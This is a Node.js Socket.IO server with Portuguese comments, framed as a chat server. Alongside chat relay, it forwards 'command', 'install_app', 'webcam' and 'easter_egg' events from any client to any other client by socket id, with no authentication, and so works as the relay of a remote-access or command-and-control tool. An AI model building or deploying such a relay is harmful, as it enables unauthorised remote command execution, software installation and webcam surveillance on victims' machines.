const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Gatekeeper para gerenciar conexões
const gatekeeper = new Set();

io.on('connection', (socket) => {
    const clientId = socket.id;
    console.log(`Cliente conectado: ${clientId}`);
    gatekeeper.add(clientId);

    // Notificar todos os clientes sobre uma nova conexão
    io.emit('message', `Cliente ${clientId} entrou no chat.`);

    // Lidar com mensagens de chat recebidas
    socket.on('chat', (data) => {
        const { target, message } = data;
        if (target === 'all') {
            io.emit('chat', { sender: clientId, message });
        } else {
            io.to(target).emit('chat', { sender: clientId, message });
        }
    });

    // Lidar com execução de comandos em um cliente específico
    socket.on('command', (data) => {
        const { target, command } = data;
        if (io.sockets.sockets.has(target)) {
            io.to(target).emit('command', { sender: clientId, command });
        } else {
            socket.emit('error', `Cliente ${target} não encontrado.`);
        }
    });

    // Lidar com comandos de Easter Egg
    socket.on('easter_egg', (data) => {
        const { target, action } = data;
        if (io.sockets.sockets.has(target)) {
            io.to(target).emit('easter_egg', { action });
        } else {
            socket.emit('error', `Cliente ${target} não encontrado.`);
        }
    });

    // Lidar com stream de webcam
    socket.on('webcam', (data) => {
        const { target, stream } = data;
        if (io.sockets.sockets.has(target)) {
            io.to(target).emit('webcam', { sender: clientId, stream });
        } else {
            socket.emit('error', `Cliente ${target} não encontrado.`);
        }
    });

    // Lidar com instalação de aplicativo remoto
    socket.on('install_app', (data) => {
        const { target, app } = data;
        if (io.sockets.sockets.has(target)) {
            io.to(target).emit('install_app', { app });
        } else {
            socket.emit('error', `Cliente ${target} não encontrado.`);
        }
    });

    // Lidar com desconexões
    socket.on('disconnect', () => {
        console.log(`Cliente desconectado: ${clientId}`);
        gatekeeper.delete(clientId);
        io.emit('message', `Cliente ${clientId} saiu do chat.`);
    });
});

app.get('/', (req, res) => {
    res.send('Servidor Socket está em execução.');
});

const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Servidor está rodando em http://localhost:${PORT}`);
});
